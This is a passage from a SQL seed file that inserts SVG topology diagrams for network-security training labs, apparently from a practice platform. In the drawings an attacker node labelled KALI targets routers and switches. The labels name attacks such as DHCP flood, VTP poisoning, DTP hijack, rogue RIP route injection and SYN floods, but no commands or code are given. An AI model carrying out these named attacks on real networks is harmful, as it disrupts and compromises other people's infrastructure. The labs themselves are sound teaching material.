  <line x1="220" y1="84" x2="190" y2="54" stroke="#2563eb" stroke-width="2"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 260" font-family="ui-monospace,monospace">
  <rect x="40" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="130" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">R1 · CLI Target</text>
  <text x="130" y="62" text-anchor="middle" font-size="9" fill="#6b7480">IP: 192.168.1.1 · SNMP: public/private</text>
  <rect x="380" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="470" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1</text>
  <text x="470" y="62" text-anchor="middle" font-size="9" fill="#6b7480">management interface</text>
  <rect x="40" y="160" width="200" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="140" y="186" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI (attacker)</text>
  <text x="140" y="204" text-anchor="middle" font-size="9" fill="#6b7480">SSH · SNMP · tcpdump port 23</text>
  <rect x="380" y="160" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="470" y="186" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC1 (admin)</text>
  <text x="470" y="204" text-anchor="middle" font-size="9" fill="#6b7480">SSH / Telnet to R1</text>
  <line x1="130" y1="160" x2="130" y2="70" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
  <line x1="470" y1="160" x2="200" y2="70" stroke="#2563eb" stroke-width="2"/>
</svg>', '["Cisco device (CLI target)", "Switch", "Attacker (CLI hijack)", "Admin user"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (19, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="33" text-anchor="middle" font-size="10" fill="#2563eb" font-weight="600">PC1 (.10)</text>
  <rect x="140" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R1</text>
  <line x1="110" y1="28" x2="140" y2="28" stroke="#2563eb" stroke-width="2"/>
  <rect x="10" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="60" y="103" text-anchor="middle" font-size="10" fill="#6b7480">SW1</text>
  <rect x="140" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="103" text-anchor="middle" font-size="10" fill="#6b7480" font-weight="600">R2</text>
  <line x1="190" y1="46" x2="190" y2="80" stroke="#14161a" stroke-width="2"/>
  <line x1="60" y1="46" x2="60" y2="80" stroke="#2563eb" stroke-width="2"/>
  <line x1="240" y1="46" x2="240" y2="80" stroke="#6b7480" stroke-width="2"/>
  <rect x="270" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="320" y="103" text-anchor="middle" font-size="10" fill="#2563eb" font-weight="600">PC3 (.20)</text>
  <rect x="10" y="152" width="100" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="60" y="175" text-anchor="middle" font-size="10" fill="#e5484d" font-weight="600">KALI</text>
  <line x1="60" y1="152" x2="130" y2="46" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <line x1="60" y1="116" x2="60" y2="152" stroke="#6b7480" stroke-width="2"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 340" font-family="ui-monospace,monospace">
  <rect x="30" y="20" width="170" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="115" y="46" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">LAN A: 192.168.10.0/24</text>
  <text x="115" y="62" text-anchor="middle" font-size="9" fill="#6b7480">PC1 .10 · PC2 .20 · R1 .1</text>
  <rect x="260" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R1 · Gateway</text>
  <text x="350" y="62" text-anchor="middle" font-size="9" fill="#6b7480">gi0/0 (.10.1) · gi0/1 (.20.1) · gi0/2 (10.0.0.1)</text>
  <rect x="500" y="20" width="170" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="585" y="46" text-anchor="middle" font-size="13" fill="#6b7480" font-weight="600">WAN: 10.0.0.0/30</text>
  <text x="585" y="62" text-anchor="middle" font-size="9" fill="#6b7480">R1 .1 → R2 .2</text>
  <line x1="200" y1="45" x2="260" y2="45" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="440" y1="45" x2="500" y2="45" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="500" y="130" width="170" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="585" y="156" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">LAN B: 172.16.20.0/24</text>
  <text x="585" y="172" text-anchor="middle" font-size="9" fill="#6b7480">PC3 .10 · R1 .1</text>
  <line x1="440" y1="70" x2="540" y2="130" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="40" y="210" width="200" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="140" y="236" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="600">KALI</text>
  <text x="140" y="254" text-anchor="middle" font-size="9" fill="#6b7480">nmap scan · IP spoof · DHCP flood</text>
  <rect x="440" y="210" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="530" y="236" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC2</text>
  <text x="530" y="254" text-anchor="middle" font-size="9" fill="#6b7480">192.168.10.20</text>
  <line x1="140" y1="210" x2="210" y2="70" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["LAN A subnet", "Router / gateway", "WAN / other subnet", "LAN B subnet", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (21, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 180" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="60" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R1</text>
  <rect x="140" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R2</text>
  <rect x="270" y="10" width="100" height="36" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="320" y="33" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">R3</text>
  <line x1="110" y1="28" x2="140" y2="28" stroke="#6b7480" stroke-width="2"/>
  <line x1="240" y1="28" x2="270" y2="28" stroke="#6b7480" stroke-width="2"/>
  <rect x="10" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="103" text-anchor="middle" font-size="10" fill="#2563eb">PC1 .1.0/24</text>
  <rect x="140" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="190" y="103" text-anchor="middle" font-size="10" fill="#2563eb">PC2 .2.0/24</text>
  <rect x="270" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="320" y="103" text-anchor="middle" font-size="10" fill="#2563eb">PC3 .3.0/24</text>
  <rect x="140" y="136" width="100" height="36" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="159" text-anchor="middle" font-size="10" fill="#e5484d">KALI</text>
  <line x1="60" y1="80" x2="60" y2="46" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="80" x2="190" y2="46" stroke="#2563eb" stroke-width="2"/>
  <line x1="320" y1="80" x2="320" y2="46" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="136" x2="110" y2="46" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 320" font-family="ui-monospace,monospace">
  <rect x="30" y="14" width="180" height="46" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="120" y="38" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1</text>
  <text x="120" y="54" text-anchor="middle" font-size="8" fill="#6b7480">.1.1 · 10.0.0.1/30</text>
  <rect x="260" y="14" width="180" height="46" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="38" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R2</text>
  <text x="350" y="54" text-anchor="middle" font-size="8" fill="#6b7480">.2.1 · 10.0.0.5/30</text>
  <rect x="490" y="14" width="180" height="46" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="580" y="38" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R3</text>
  <text x="580" y="54" text-anchor="middle" font-size="8" fill="#6b7480">.3.1 · 10.0.0.10/30</text>
  <line x1="210" y1="37" x2="260" y2="37" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="440" y1="37" x2="490" y2="37" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="30" y="130" width="180" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN: 192.168.1.0/24</text>
  <rect x="260" y="130" width="180" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="350" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN: 192.168.2.0/24</text>
  <rect x="490" y="130" width="180" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="580" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN: 192.168.3.0/24</text>
  <rect x="240" y="240" width="220" height="54" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="350" y="266" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI</text>
  <text x="350" y="284" text-anchor="middle" font-size="9" fill="#6b7480">blackhole · hijack · loop</text>
  <line x1="350" y1="240" x2="120" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["Router", "Router with route poisoning", "Router", "End-host LAN", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (23, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="140" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="200" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R1–R2–R3</text>
  <rect x="10" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="101" text-anchor="middle" font-size="9" fill="#2563eb">LAN A /26</text>
  <rect x="140" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="190" y="101" text-anchor="middle" font-size="9" fill="#2563eb">LAN B /27</text>
  <rect x="290" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="340" y="101" text-anchor="middle" font-size="9" fill="#2563eb">LAN C /28</text>
  <rect x="140" y="148" width="120" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="200" y="170" text-anchor="middle" font-size="9" fill="#e5484d">KALI (squatter)</text>
  <line x1="60" y1="80" x2="145" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="190" y1="80" x2="200" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="340" y1="80" x2="255" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="200" y1="148" x2="200" y2="50" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 300" font-family="ui-monospace,monospace">
  <rect x="200" y="14" width="300" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="40" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R1 · R2 · R3 — VLSM Core</text>
  <text x="350" y="56" text-anchor="middle" font-size="9" fill="#6b7480">Summary: 192.168.1.0/25 → R3</text>
  <rect x="30" y="130" width="160" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="110" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN A: /26 (50 hosts)</text>
  <text x="110" y="170" text-anchor="middle" font-size="8" fill="#6b7480">192.168.1.0–63</text>
  <rect x="240" y="130" width="160" height="46" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="320" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">LAN B: /27 (25 hosts)</text>
  <text x="320" y="170" text-anchor="middle" font-size="8" fill="#6b7480">192.168.1.64–95</text>
  <rect x="490" y="130" width="180" height="46" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="580" y="156" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="580" y="170" text-anchor="middle" font-size="8" fill="#6b7480">summary hijack · squatter</text>
  <line x1="110" y1="130" x2="230" y2="64" stroke="#2563eb" stroke-width="2"/>
  <line x1="320" y1="130" x2="350" y2="64" stroke="#2563eb" stroke-width="2"/>
  <line x1="580" y1="130" x2="480" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["VLSM routers + WAN links", "LAN A /26", "LAN B /27", "Attacker / subnet squatter"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (24, '<svg viewBox="0 0 380 160" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">SW1 (server)</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10" font-weight="600">SW2 (client)</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" font-weight="600">SW3 (transparent)</text><line x1="110" y1="27" x2="140" y2="27" stroke="#6b7480" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#6b7480" stroke-width="2"/><rect x="10" y="76" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="98" text-anchor="middle" font-size="9" font-weight="600">PC1 (V10)</text><rect x="140" y="76" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="190" y="98" text-anchor="middle" font-size="9" font-weight="600">PC2 (V20)</text><rect x="140" y="120" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="190" y="142" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI</text><line x1="60" y1="76" x2="60" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="76" x2="190" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="190" y1="120" x2="190" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 240" font-family="monospace"><rect x="30" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="110" y="38" text-anchor="middle" font-size="13" font-weight="700">SW1 · VTP Server</text><text x="110" y="54" text-anchor="middle" font-size="8" fill="#6b7480">revision 5 · VLANs 1,10,20</text><rect x="220" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="300" y="38" text-anchor="middle" font-size="13" font-weight="700">SW2 · VTP Client</text><text x="300" y="54" text-anchor="middle" font-size="8" fill="#6b7480">revision 5 · learns VLANs</text><rect x="410" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="490" y="38" text-anchor="middle" font-size="13" font-weight="700">SW3 · Transparent</text><text x="490" y="54" text-anchor="middle" font-size="8" fill="#6b7480">same VTP domain · forwards</text><line x1="190" y1="37" x2="220" y2="37" stroke="#6b7480" stroke-width="2"/><line x1="380" y1="37" x2="410" y2="37" stroke="#6b7480" stroke-width="2"/><rect x="30" y="130" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="110" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 · VLAN 10</text><rect x="410" y="130" width="160" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="490" y="156" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC2 · VLAN 20</text><rect x="200" y="190" width="200" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="300" y="214" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI · VTP poison · DTP hijack</text><line x1="110" y1="130" x2="110" y2="60" stroke="#2563eb" stroke-width="2"/><line x1="490" y1="130" x2="490" y2="60" stroke="#2563eb" stroke-width="2"/><line x1="300" y1="190" x2="220" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["VTP server", "VTP client", "VTP transparent", "Host", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (26, '<svg viewBox="0 0 380 120" font-family="monospace"><rect x="10" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="70" y="33" text-anchor="middle" font-size="11" font-weight="600">SW1</text><rect x="250" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="310" y="33" text-anchor="middle" font-size="11" font-weight="600">SW2</text><line x1="130" y1="30" x2="180" y2="30" stroke="#2563eb" stroke-width="3"/><line x1="200" y1="30" x2="250" y2="30" stroke="#2563eb" stroke-width="3"/><text x="190" y="24" text-anchor="middle" font-size="8" fill="#2563eb">Po1</text><rect x="140" y="74" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="190" y="96" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI</text><line x1="190" y1="74" x2="70" y2="50" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 500 180" font-family="monospace"><rect x="30" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="120" y="46" text-anchor="middle" font-size="14" font-weight="700">SW1</text><text x="120" y="62" text-anchor="middle" font-size="9" fill="#6b7480">Gi0/23 + Gi0/24 → Po1</text><rect x="290" y="20" width="180" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="380" y="46" text-anchor="middle" font-size="14" font-weight="700">SW2</text><text x="380" y="62" text-anchor="middle" font-size="9" fill="#6b7480">LACP active</text><line x1="210" y1="45" x2="240" y2="45" stroke="#2563eb" stroke-width="2.5"/><line x1="240" y1="35" x2="260" y2="35" stroke="#2563eb" stroke-width="2.5"/><line x1="240" y1="55" x2="260" y2="55" stroke="#2563eb" stroke-width="2.5"/><text x="250" y="28" font-size="8" fill="#2563eb">Po1</text><rect x="160" y="130" width="180" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="250" y="154" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI · LACP spoof</text><line x1="250" y1="130" x2="200" y2="70" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Switch", "Switch with EtherChannel", "Bundle (logical link)", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (27, '<svg viewBox="0 0 380 140" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10" font-weight="600">R2</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" font-weight="600">R3</text><line x1="110" y1="27" x2="140" y2="27" stroke="#2563eb" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#2563eb" stroke-width="2"/><text x="190" y="24" text-anchor="middle" font-size="7" fill="#2563eb">RIP</text><rect x="10" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="102" text-anchor="middle" font-size="9" font-weight="600">PC1</text><rect x="270" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="102" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI (FRR)</text><line x1="60" y1="80" x2="60" y2="44" stroke="#2563eb" stroke-width="2"/><line x1="320" y1="80" x2="280" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 220" font-family="monospace"><rect x="20" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="100" y="38" text-anchor="middle" font-size="13" font-weight="700">R1 · RIP</text><text x="100" y="54" text-anchor="middle" font-size="8" fill="#6b7480">learning from R2+R3</text><rect x="220" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="300" y="38" text-anchor="middle" font-size="13" font-weight="700">R2 · RIP</text><text x="300" y="54" text-anchor="middle" font-size="8" fill="#6b7480">redistributes</text><rect x="420" y="14" width="160" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="500" y="38" text-anchor="middle" font-size="13" font-weight="700">R3 · RIP</text><text x="500" y="54" text-anchor="middle" font-size="8" fill="#6b7480">redistributes</text><line x1="180" y1="37" x2="220" y2="37" stroke="#2563eb" stroke-width="2"/><line x1="380" y1="37" x2="420" y2="37" stroke="#2563eb" stroke-width="2"/><rect x="160" y="140" width="280" height="50" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="300" y="166" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · FRR Rogue RIP</text><text x="300" y="182" text-anchor="middle" font-size="9" fill="#6b7480">injecting 0.0.0.0/0 · metric 1</text><line x1="180" y1="140" x2="140" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["RIP router", "RIP router", "RIP router", "Attacker (rogue RIP)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (29, '<svg viewBox="0 0 380 140" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">PC1 (client)</text><rect x="140" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="190" y="32" text-anchor="middle" font-size="10" font-weight="600">R1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#2563eb" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" font-weight="600">PC2 (server)</text><line x1="110" y1="27" x2="140" y2="27" stroke="#2563eb" stroke-width="2"/><line x1="240" y1="27" x2="270" y2="27" stroke="#6b7480" stroke-width="2"/><rect x="140" y="80" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="190" y="102" text-anchor="middle" font-size="9" fill="#e5484d" font-weight="600">KALI</text><line x1="190" y1="80" x2="190" y2="44" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/></svg>', '<svg viewBox="0 0 600 220" font-family="monospace"><rect x="40" y="14" width="160" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="120" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC1 (client)</text><text x="120" y="56" text-anchor="middle" font-size="8" fill="#6b7480">HTTP client</text><rect x="220" y="14" width="160" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="300" y="40" text-anchor="middle" font-size="13" font-weight="600">R1 · TCP intercept</text><text x="300" y="56" text-anchor="middle" font-size="8" fill="#6b7480">rate-limit UDP</text><rect x="400" y="14" width="160" height="50" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/><text x="480" y="40" text-anchor="middle" font-size="13" fill="#2563eb" font-weight="600">PC2 (server)</text><text x="480" y="56" text-anchor="middle" font-size="8" fill="#6b7480">HTTP · port 80</text><line x1="200" y1="39" x2="220" y2="39" stroke="#2563eb" stroke-width="2"/><line x1="380" y1="39" x2="400" y2="39" stroke="#6b7480" stroke-width="2"/><rect x="160" y="150" width="280" height="50" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="300" y="176" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI</text><text x="300" y="192" text-anchor="middle" font-size="9" fill="#6b7480">SYN flood · UDP flood · port scan</text><line x1="300" y1="150" x2="300" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/></svg>', '["Client (TCP/UDP)", "Router with transport protection", "Server (TCP/UDP)", "Attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (33, '<svg viewBox="0 0 380 100" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#6b7480" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1+SW1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI (syslog)</text><line x1="110" y1="27" x2="270" y2="27" stroke="#6b7480" stroke-width="2"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="180" height="46" rx="8" fill="#fff" stroke="#6b7480" stroke-width="2"/><text x="120" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · Syslog client</text><text x="120" y="56" text-anchor="middle" font-size="8" fill="#6b7480">logging trap debugging</text><rect x="280" y="14" width="190" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="375" y="40" text-anchor="middle" font-size="13" fill="#e5484d" font-weight="700">KALI · Syslog server</text><text x="375" y="56" text-anchor="middle" font-size="8" fill="#6b7480">UDP 514 · rsyslog</text><line x1="210" y1="37" x2="280" y2="37" stroke="#6b7480" stroke-width="2"/></svg>', '["Network devices", "Syslog server/attacker"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (34, '<svg viewBox="0 0 380 100" font-family="monospace"><rect x="10" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#14161a" stroke-width="1.5"/><text x="60" y="32" text-anchor="middle" font-size="10" font-weight="600">R1</text><rect x="270" y="10" width="100" height="34" rx="6" fill="#fff" stroke="#e5484d" stroke-width="1.5"/><text x="320" y="32" text-anchor="middle" font-size="10" fill="#e5484d">KALI (TFTP)</text><line x1="110" y1="27" x2="270" y2="27" stroke="#6b7480" stroke-width="2"/></svg>', '<svg viewBox="0 0 500 120" font-family="monospace"><rect x="30" y="14" width="180" height="46" rx="8" fill="#fff" stroke="#14161a" stroke-width="2"/><text x="120" y="40" text-anchor="middle" font-size="13" font-weight="700">R1 · TFTP client</text><text x="120" y="56" text-anchor="middle" font-size="8" fill="#6b7480">config backup / IOS upgrade</text><rect x="280" y="14" width="190" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="2"/><text x="375" y="40" text-anchor="middle" font-size="13" fill="#e5484d" 